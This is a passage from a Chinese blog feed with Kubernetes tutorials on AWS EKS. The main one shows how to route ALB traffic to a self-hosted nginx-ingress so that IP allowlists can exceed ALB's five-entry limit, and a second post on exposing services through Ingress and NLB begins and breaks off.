AppSync等资源可以用它来防范DDoS攻击、SQL注入等。</p><p>既然以上两个方案都行不通，那有没有其它可行的方案呢？</p><h2 id="三、灵机一动"><a href="#三、灵机一动" class="headerlink" title="三、灵机一动"></a>三、灵机一动</h2><p>这时，我从之前的 Ingress+NLB 方案中有了启发，那需要怎么进行调整呢，通过下图我们一起来看看：</p><p>这是调整前服务暴露方式</p><p><img src="/2021/05/27/eks-ingress-alb-ru-he-tu-po-bai-ming-dan-shu-liang-xian-zhi/%E5%9B%BE%E7%89%871.png" alt="图片1"></p><p>这是调整后的服务暴露方式</p><p><img src="/2021/05/27/eks-ingress-alb-ru-he-tu-po-bai-ming-dan-shu-liang-xian-zhi/%E5%9B%BE%E7%89%872.png" alt="图片2"></p><p><strong>首先：</strong>有服务A.service.com和B.service.com 两个服务，我们需要对B.service.com配置白名单访问，由于ALB只支持5个白名单配置，图1 中当白名单超过5个时便达到了瓶颈；</p><p><strong>同样：</strong>在图2 中我们只需要将配置白名单的服务B.service.com从ALB转发给自建Ingress 由该Ingress服务进行白名单审核之后将流量再转发给后端的service-B，我们只需要在自建Ingress中配置白名单，而且自建Ingress内部是nginx服务理论上支持的白名单数量无限。</p><p>这样一来，就可以完美解决ALB白名单不够用的问题了。</p><p>那么，具体要怎么实现呢</p><h2 id="四、实施过程"><a href="#四、实施过程" class="headerlink" title="四、实施过程"></a>四、实施过程</h2><h3 id="4-1-部署Ingress-ALB"><a href="#4-1-部署Ingress-ALB" class="headerlink" title="4.1 部署Ingress+ALB"></a>4.1 部署Ingress+ALB</h3><p>这里已经部署好了 EKS Ingress+ALB 就不在进行阐述了，可以参考<a href="https://aws.amazon.com/cn/blogs/china/kubernetes-ingress-aws-alb-ingress-controller/" target="_blank" rel="noopener">AWS官方文档</a>进行部署</p><h3 id="4-2-部署自建Ingress"><a href="#4-2-部署自建Ingress" class="headerlink" title="4.2 部署自建Ingress"></a>4.2 部署自建Ingress</h3><p>自建Ingress我选择的是<a href="https://github.com/kubernetes/ingress-nginx/tree/nginx-0.30.0" target="_blank" rel="noopener">nginx-ingress</a>，部署和上篇文章差不多但，但在部署Service时略有差异，具体我们一起来看下：</p><h4 id="4-2-1-部署deployment"><a href="#4-2-1-部署deployment" class="headerlink" title="4.2.1 部署deployment"></a>4.2.1 部署deployment</h4><p>首先从GitHub克隆下来代码，切换到最新的tag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/kubernetes/ingress-nginx.git</span><br><span class="line">$ <span class="built_in">cd</span> ingress-nginx/</span><br><span class="line">$ git checkout nginx-0.30.0</span><br><span class="line">$ git branch</span><br><span class="line">* (HEAD detached at nginx-0.30.0)</span><br><span class="line">  master</span><br></pre></td></tr></table></figure><p>接下来部署<code>deploy/static</code>目录下的<code>mandatory.yaml</code> ，生产环境建把pod副本数设置为2以上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> deploy/static/</span><br><span class="line">$ ls</span><br><span class="line">configmap.yaml  namespace.yaml  rbac.yaml</span><br><span class="line">mandatory.yaml  provider/       with-rbac.yaml</span><br></pre></td></tr></table></figure><p><strong>修改时区</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ vim mandatory.yaml</span><br><span class="line">env:</span><br><span class="line">  - name: TZ</span><br><span class="line">    value: Asia/Shanghai</span><br></pre></td></tr></table></figure><blockquote><p>如果有需要特殊调整（例如：修改Ingress健康检测路径与ALB一致），可以参考<a href="https://kubernetes.github.io/ingress-nginx/user-guide/cli-arguments/" target="_blank" rel="noopener">https://kubernetes.github.io/ingress-nginx/user-guide/cli-arguments/</a></p></blockquote><p>我这里是测试环境，将<code>mandatory.yaml</code>文件的namespace都改成了qa</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl apply -f mandatory.yaml</span><br></pre></td></tr></table></figure><p>部署完后查看deployment部署状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl get pod -n qa | grep ingress</span><br><span class="line">nginx-ingress-controller-7cccb55579-4rqvv   1/1     Running   0          25h</span><br><span class="line"></span><br><span class="line">$ kubectl get deployment -n qa | grep ingress</span><br><span class="line">nginx-ingress-controller   1/1     1            1           25h</span><br></pre></td></tr></table></figure><p>如果有多namespace部署Ingress的需求，需要把<strong>ClusterRoleBinding</strong> 的 <strong>name</strong> 修改为不同名称（否则容器会启动失败），我这里将原来的<code>nginx-ingress-clusterrole-nisa-binding</code>改为了<code>nginx-ingress-clusterrole-nisa-binding-qa</code> 最好是<strong>ClusterRole</strong> 的 <strong>name</strong> 也一起修改。</p><blockquote><p>---<br>apiVersion: rbac.authorization.k8s.io/v1beta1<br>kind: ClusterRole<br>metadata:<br>name: <font color="red">nginx-ingress-clusterrole-qa</font></p><p>…………忽略部分内容…………</p><p>---<br>apiVersion: rbac.authorization.k8s.io/v1beta1<br>kind: ClusterRoleBinding<br>metadata:<br>name: <font color="red">nginx-ingress-clusterrole-nisa-binding-qa</font><br>labels:<br>app.kubernetes.io/name: ingress-nginx<br>app.kubernetes.io/part-of: ingress-nginx<br>roleRef:<br>apiGroup: rbac.authorization.k8s.io<br>kind: ClusterRole<br>name: <font color="red">nginx-ingress-clusterrole-qa</font><br>subjects:</p><ul><li>kind: ServiceAccount<br>name: nginx-ingress-serviceaccount<br>namespace: qa</li></ul></blockquote><h4 id="4-2-2-部署service"><a href="#4-2-2-部署service" class="headerlink" title="4.2.2 部署service"></a>4.2.2 部署service</h4><p>在上篇文章中我们创建Service是为了让它自动去创建相应的NLB服务然后自动和Service关联上。</p><p>但在这里，我调整了架构（将ALB流量转发到自建Ingress），所以要把Service创建NLB部分的配置去掉，让我们自建的Ingress对接ALB的转发规则。后面我们只需要ALB把客户端的真实IP传过来就可以做白名单限制了。</p><p>修改service.yaml，或者直接使用没有云服务商配置的service.yaml</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> provider/baremetal/</span><br><span class="line">$ cat service-nodeport.yaml</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: ingress-nginx</span><br><span class="line">  namespace: qa</span><br><span class="line">  labels:</span><br><span class="line">    app.kubernetes.io/name: ingress-nginx</span><br><span class="line">    app.kubernetes.io/part-of: ingress-nginx</span><br><span class="line">spec:</span><br><span class="line">  <span class="built_in">type</span>: NodePort</span><br><span class="line">  ports:</span><br><span class="line">    - name: http</span><br><span class="line">      port: 80</span><br><span class="line">      targetPort: 80</span><br><span class="line">      protocol: TCP</span><br><span class="line">    - name: https</span><br><span class="line">      port: 443</span><br><span class="line">      targetPort: 443</span><br><span class="line">      protocol: TCP</span><br><span class="line">  selector:</span><br><span class="line">    app.kubernetes.io/name: ingress-nginx</span><br><span class="line">    app.kubernetes.io/part-of: ingress-nginx</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">$ kubectl apply -f service-nodeport.yaml</span><br></pre></td></tr></table></figure><p>部署完后查看service状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl get service -n qa| grep ingress</span><br><span class="line">ingress-nginx          NodePort   172.20.103.222   &lt;none&gt;        80:30971/TCP,443:32039/TCP   25h</span><br></pre></td></tr></table></figure><h3 id="4-3-测试白名单"><a href="#4-3-测试白名单" class="headerlink" title="4.3 测试白名单"></a>4.3 测试白名单</h3><h4 id="4-3-1-部署测试服务"><a href="#4-3-1-部署测试服务" class="headerlink" title="4.3.1 部署测试服务"></a>4.3.1 部署测试服务</h4><p>部署nginx服务</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">cat</span> <span class="string">nginx-deployment-service.yaml</span></span><br><span class="line"></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">nginx-deployment</span></span><br><span class="line"><span class="attr">  namespace:</span> <span class="string">qa</span></span><br><span class="line"><span class="attr">  labels:</span></span><br><span class="line"><span class="attr">    app:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  replicas:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">  selector:</span></span><br><span class="line"><span class="attr">    matchLabels:</span></span><br><span class="line"><span class="attr">      app:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">  template:</span></span><br><span class="line"><span class="attr">    metadata:</span></span><br><span class="line"><span class="attr">      creationTimestamp:</span> <span class="literal">null</span></span><br><span class="line"><span class="attr">      labels:</span></span><br><span class="line"><span class="attr">        app:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">    spec:</span></span><br><span class="line"><span class="attr">      containers:</span></span><br><span class="line"><span class="attr">        - name:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">          image:</span> <span class="string">'nginx:1.16.0'</span></span><br><span class="line"><span class="attr">          ports:</span></span><br><span class="line"><span class="attr">            - containerPort:</span> <span class="number">80</span></span><br><span class="line"><span class="attr">              protocol:</span> <span class="string">TCP</span></span><br><span class="line"><span class="attr">          resources:</span> <span class="string">&#123;&#125;</span></span><br><span class="line"><span class="attr">          terminationMessagePath:</span> <span class="string">/dev/termination-log</span></span><br><span class="line"><span class="attr">          terminationMessagePolicy:</span> <span class="string">File</span></span><br><span class="line"><span class="attr">          imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line"><span class="attr">      restartPolicy:</span> <span class="string">Always</span></span><br><span class="line"><span class="attr">      terminationGracePeriodSeconds:</span> <span class="number">30</span></span><br><span class="line"><span class="attr">      dnsPolicy:</span> <span class="string">ClusterFirst</span></span><br><span class="line"><span class="attr">      nodeSelector:</span></span><br><span class="line"><span class="attr">        running_env:</span> <span class="string">qa</span></span><br><span class="line"><span class="attr">      securityContext:</span> <span class="string">&#123;&#125;</span></span><br><span class="line"><span class="attr">      schedulerName:</span> <span class="string">default-scheduler</span></span><br><span class="line"><span class="attr">  strategy:</span></span><br><span class="line"><span class="attr">    type:</span> <span class="string">RollingUpdate</span></span><br><span class="line"><span class="attr">    rollingUpdate:</span></span><br><span class="line"><span class="attr">      maxUnavailable:</span> <span class="number">25</span><span class="string">%</span></span><br><span class="line"><span class="attr">      maxSurge:</span> <span class="number">25</span><span class="string">%</span></span><br><span class="line"><span class="attr">  revisionHistoryLimit:</span> <span class="number">10</span></span><br><span class="line"><span class="attr">  progressDeadlineSeconds:</span> <span class="number">600</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">nginx-service</span></span><br><span class="line"><span class="attr">  namespace:</span> <span class="string">qa</span></span><br><span class="line"><span class="attr">  labels:</span></span><br><span class="line"><span class="attr">    app:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  ports:</span></span><br><span class="line"><span class="attr">    - protocol:</span> <span class="string">TCP</span></span><br><span class="line"><span class="attr">      port:</span> <span class="number">80</span></span><br><span class="line"><span class="attr">      targetPort:</span> <span class="number">80</span></span><br><span class="line"><span class="attr">  selector:</span></span><br><span class="line"><span class="attr">    app:</span> <span class="string">nginx</span></span><br><span class="line"></span><br><span class="line"><span class="string">$</span> <span class="string">kubectl</span> <span class="string">apply</span> <span class="bullet">-f</span> <span class="string">nginx-deployment-service.yaml</span></span><br></pre></td></tr></table></figure><h4 id="4-3-2-配置Ingress转发规则"><a href="#4-3-2-配置Ingress转发规则" class="headerlink" title="4.3.2 配置Ingress转发规则"></a>4.3.2 配置Ingress转发规则</h4><p>这里需要配置两个Ingress规则（AWS Ingress和自建Ingress）</p><ul><li><p>AWS Ingress：将需要配置白名单的服务转发给自建Ingress</p></li><li><p>自建Ingress：配置白名单，将流量转发给后端服务</p></li></ul><p><strong>配置 AWS Ingress规则</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">- host:</span> <span class="string">au-nginx.qa.service.com</span></span><br><span class="line"><span class="attr">  http:</span></span><br><span class="line"><span class="attr">    paths:</span></span><br><span class="line"><span class="attr">      - backend:</span></span><br><span class="line"><span class="attr">          serviceName:</span> <span class="string">ssl-redirect</span></span><br><span class="line"><span class="attr">          servicePort:</span> <span class="string">use-annotation</span></span><br><span class="line"><span class="attr">      - backend:</span></span><br><span class="line"><span class="attr">          serviceName:</span> <span class="string">ingress-nginx</span></span><br><span class="line"><span class="attr">          servicePort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><blockquote><p>只需要将原先backend转发到<code>服务</code>的Service改为我们部署的<code>ingress-nginx</code> Service即可</p></blockquote><p><strong>配置自建Ingress规则1</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">Ingress</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">extensions/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">au-nginx.qa.service.com</span></span><br><span class="line"><span class="attr">  namespace:</span> <span class="string">qa</span></span><br><span class="line"><span class="attr">  annotations:</span></span><br><span class="line">    <span class="string">kubernetes.io/ingress.class:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="string">nginx.ingress.kubernetes.io/server-snippet:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      set_real_ip_from 10.0.0.0/8; #上一级代理的IP地址或者IP段,可以写多行。</span></span><br><span class="line"><span class="string">      real_ip_header X-Forwarded-For; #从哪个header头检索出需要的IP地址。</span></span><br><span class="line"><span class="string">      real_ip_recursive on; #递归的去除所配置中的可信IP。</span></span><br><span class="line"><span class="string">      access_log /var/log/nginx/au-nginx.access.log upstreaminfo;</span></span><br><span class="line"><span class="string">    nginx.ingress.kubernetes.io/whitelist-source-range: 12.96.203.241/32</span></span><br><span class="line"><span class="string"></span><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  rules:</span></span><br><span class="line"><span class="attr">    - host:</span> <span class="string">au-nginx.qa.service.com</span></span><br><span class="line"><span class="attr">      http:</span></span><br><span class="line"><span class="attr">        paths:</span></span><br><span class="line"><span class="attr">          - backend:</span></span><br><span class="line"><span class="attr">              serviceName:</span> <span class="string">nginx-service</span></span><br><span class="line"><span class="attr">              servicePort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><ul><li>nginx.ingress.kubernetes.io/server-snippet：在nginx 的 server 配置块中添加自定义配置；</li><li>nginx.ingress.kubernetes.io/whitelist-source-range：允许的客户端IP源范围，该值是逗号分隔的<a href="https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing" target="_blank" rel="noopener">CIDR</a>列表，例如<code>10.0.0.0/24,172.10.0.1</code>。</li></ul><p>如果不知道上一级代理的IP地址或者IP段，可以使用下面第二种方式</p><p><strong>配置自建Ingress规则2</strong></p><p>修改 <code>nginx-igres</code>s 的 <code>configmap</code> 配置 <code>nginx-configuration</code>，增加以下配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data:</span></span><br><span class="line"><span class="attr">  compute-full-forwarded-for:</span> <span class="string">'true'</span></span><br><span class="line"><span class="attr">  forwarded-for-header:</span> <span class="string">X-Forwarded-For</span></span><br><span class="line"><span class="attr">  use-forwarded-headers:</span> <span class="string">'true'</span></span><br></pre></td></tr></table></figure><p>该配置对所在 <code>namespace</code> 下的所有 <code>ingress</code> 都生效，所以在该 <code>namespace</code> 下的 <code>ingress</code> 只需要配置允许访问的白名单IP即可</p><p>然后配置ingress规则</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">Ingress</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">extensions/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">au-nginx.qa.service.com</span></span><br><span class="line"><span class="attr">  namespace:</span> <span class="string">qa</span></span><br><span class="line"><span class="attr">  annotations:</span></span><br><span class="line">    <span class="string">kubernetes.io/ingress.class:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="string">nginx.ingress.kubernetes.io/server-snippet:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      access_log /var/log/nginx/au-nginx.access.log upstreaminfo;</span></span><br><span class="line"><span class="string">    nginx.ingress.kubernetes.io/whitelist-source-range: 12.96.203.241/32</span></span><br><span class="line"><span class="string"></span><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  rules:</span></span><br><span class="line"><span class="attr">    - host:</span> <span class="string">au-nginx.qa.service.com</span></span><br><span class="line"><span class="attr">      http:</span></span><br><span class="line"><span class="attr">        paths:</span></span><br><span class="line"><span class="attr">          - backend:</span></span><br><span class="line"><span class="attr">              serviceName:</span> <span class="string">nginx-service</span></span><br><span class="line"><span class="attr">              servicePort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><p>以上便是架构调整部分的具体实施步骤（实际就修改了两个Ingress配置），现在我们来验证服务是否可以访问，以及白名单是否生效。</p><h4 id="4-3-3-测试白名单配置"><a href="#4-3-3-测试白名单配置" class="headerlink" title="4.3.3 测试白名单配置"></a>4.3.3 测试白名单配置</h4><p>以上配置好后，当我们在白名单所在服务器上访问时</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@host ~]<span class="comment"># curl -Ik http://au-nginx.qa.service.com</span></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Fri, 28 May 2021 09:02:58 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 1241</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Server: nginx/1.17.8</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Last-Modified: Wed, 26 May 2021 10:47:38 GMT</span><br><span class="line">ETag: <span class="string">"60ae274a-4d9"</span></span><br><span class="line">Cache-Control: no-store, no-cache, private</span><br><span class="line">Accept-Ranges: bytes</span><br></pre></td></tr></table></figure><p>在其它服务器上访问时</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ curl -Ik http://au-nginx.qa.service.com</span><br><span class="line">HTTP/1.1 403 Forbidden</span><br><span class="line">Date: Fri, 28 May 2021 09:17:05 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 153</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Server: nginx/1.17.8</span><br></pre></td></tr></table></figure><p>到这里已经把原先ALB的白名单移到了我们自建的Ingress上，以后再也不用为ALB的白名单配额不够而发愁了。</p><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --&gt;&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;
      
    
    </summary>
    
    
      <category term="kubernetes" scheme="http://chenzhonzhou.github.io/categories/kubernetes/"/>
    
    
      <category term="kubernetes - Ingress" scheme="http://chenzhonzhou.github.io/tags/kubernetes-Ingress/"/>
    
  </entry>
  
  <entry>
    <title>EKS使用Ingress+NLB对外暴露服务</title>
    <link href="http://chenzhonzhou.github.io/2021/05/20/eks-shi-yong-ingress-nlb-dui-wai-bao-lu-fu-wu/"/>
    <id>http://chenzhonzhou.github.io/2021/05/20/eks-shi-yong-ingress-nlb-dui-wai-bao-lu-fu-wu/</id>
    <published>2021-05-20T09:43:13.000Z</published>
    <updated>2021-07-08T07:15:38.692Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --><h2 id="一、为什么不想使用AWS的Ingress"><a href="#一、为什么不想使用AWS的Ingress" class="headerlink" title="一、为什么不想使用AWS的Ingress"></a>一、为什么不想使用AWS的Ingress</h2><p>公司k8s使用的是AWS的EKS，相应的Ingress等服务也是AWS经过修改的版本，使用Ingress + ALB方式对外暴露服务，由于AWS的ALB白名单只支持5个地址（Ingress一条规则配置的域名+白名单IP不得超过5个，虽然配置都在Ingress但实际操作的还是Ingress后端的ALB服务）。</p><p>这样，相当于<strong>1个域名最多只能配置4个白名单地址</strong>，奇怪的是AWS的负载均衡器居然不支持扩容白名单配额，这样的话就只能自己建一个了；于是打算向Ingress+NLB方案靠拢，因为自建Ingress它的白名单是写到nginx配置里的，这样只需要负载均衡器将客户端IP传过来就可以了。</p><p>下面就通过自建Ingress，我们一起来熟悉它的部署和使用。</p><h2 id="二、K8s中对外暴露服务的方式"><a href="#二、K8s中对外暴露服务的方式" class="headerlink" title="二、K8s中对外暴露服务的方式"></a>二、K8s中对外暴露服务的方式</h2><h3 id="1-1、NodePort-Service"><a href="#1-1、NodePort-Service" class="headerlink" title="1.1、NodePort Service"></a>1.1、NodePort Service</h3><p>NodePort Service 顾名思义，实质上就是通过在集群的每个 node 上暴露一个端口，然后将这个端口映射到某个具体的 service 来实现的，虽然每个 node 的端口有很多(0~65535)，但是由于安全性和易用性(服务多了就乱了，还有端口冲突问题)实际使用可能并不多</p><h3 id="1-2、LoadBlancer-Service"><a href="#1-2、LoadBlancer-Service" class="headerlink" title="1.2、LoadBlancer Service"></a>1.2、LoadBlancer Service</h3><p>LoadBlancer Service 是 kubernetes 深度结合云平台的一个组件；当使用 LoadBlancer Service 暴露服务时，实际上是通过<strong>向底层云平台申请创建一个负载均衡器</strong>来向外暴露服务；目前 LoadBlancer Service 支持的云平台已经相对完善，比如国外的 GCE、DigitalOcean，国内的 阿里云，私有云 Openstack 等等，由于 LoadBlancer Service 深度结合了云平台，所以只能在一些云平台上来使用</p><h3 id="1-3、Ingress"><a href="#1-3、Ingress" class="headerlink" title="1.3、Ingress"></a>1.3、Ingress</h3><p>Ingress 这个东西是 1.2 后才出现的，通过 Ingress 用户可以实现使用 nginx 等开源的反向代理负载均衡器实现对外暴露服务，以下详细说一下 Ingress，毕竟 traefik 用的就是 Ingress</p><p><strong>使用 Ingress 时一般会有三个组件:</strong></p><ul><li>反向代理负载均衡器</li><li>Ingress Controller</li><li>Ingress</li></ul><h4 id="1-3-1、反向代理负载均衡器"><a href="#1-3-1、反向代理负载均衡器" class="headerlink" title="1.3.1、反向代理负载均衡器"></a>1.3.1、反向代理负载均衡器</h4><p>反向代理负载均衡器很简单，说白了就是 nginx、apache 什么的；在集群中反向代理负载均衡器可以自由部署，可以使用 Replication Controller、Deployment、DaemonSet 等等，不过个人喜欢以 DaemonSet 的方式部署，感觉比较方便</p><h4 id="1-3-2、Ingress-Controller"><a href="#1-3-2、Ingress-Controller" class="headerlink" title="1.3.2、Ingress Controller"></a>1.3.2、Ingress Controller</h4><p>Ingress Controller 实质上可以理解为是个监视器，Ingress Controller 通过不断地跟 kubernetes API 打交道，实时的感知后端 service、pod 等变化，比如新增和减少 pod，service 增加与减少等；当得到这些变化信息后，Ingress Controller 再结合下文的 Ingress 生成配置，然后更新反向代理负载均衡器，并刷新其配置，达到服务发现的作用</p><h4 id="1-3-3、Ingress"><a href="#1-3-3、Ingress" class="headerlink" title="1.3.3、Ingress"></a>1.3.3、Ingress</h4><p>Ingress 简单理解就是个规则定义；比如说某个域名对应某个 service，即当某个域名的请求进来时转发给某个 service;这个规则将与 Ingress Controller 结合，然后 Ingress Controller 将其动态写入到负载均衡器配置中，从而实现整体的服务发现和负载均衡</p><p><strong>有点懵逼，那就看图</strong></p><h2 id="三、Ingress当前的实现方式"><a href="#三、Ingress当前的实现方式" class="headerlink" title="三、Ingress当前的实现方式"></a>三、Ingress当前的实现方式</h2><p><img src="/2021/05/20/eks-shi-yong-ingress-nlb-dui-wai-bao-lu-fu-wu/%E5%9B%BE%E7%89%871.png" alt="图片1"></p><p>Ingress的实现方式这么多，应该怎么选型呢？</p><p>别急，在选型前不妨先看看大姥对Ingress的性能测试：<a href="https://www.cnblogs.com/leozhanggg/p/13189173.html" target="_blank" rel="noopener">https://www.cnblogs.com/leozhanggg/p/13189173.html</a></p><p>这里我选择使用nginx-ingress，原因无它，性能非常接近原生nginx。</p><h2 id="四、部署Ingress"><a href="#四、部署Ingress" class="headerlink" title="四、部署Ingress"></a>四、部署Ingress</h2><p>Ingress GitHub地址：<a href="https://github.com/kubernetes/ingress-nginx/tree/nginx-0.30.0" target="_blank" rel="noopener">https://github.com/kubernetes/ingress-nginx/tree/nginx-0.30.0</a></p><p>选择最新的tag，当前使用的是0.30.0</p><h3 id="4-1-部署deploy"><a href="#4-1-部署deploy" class="headerlink" title="4.1 部署deploy"></a>4.1 部署deploy</h3><p>克隆下来代码库后先切换到最新的tag，当前使用tag的是0.30.0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/kubernetes/ingress-nginx.git</span><br><span class="line">$ <span class="built_in">cd</span> 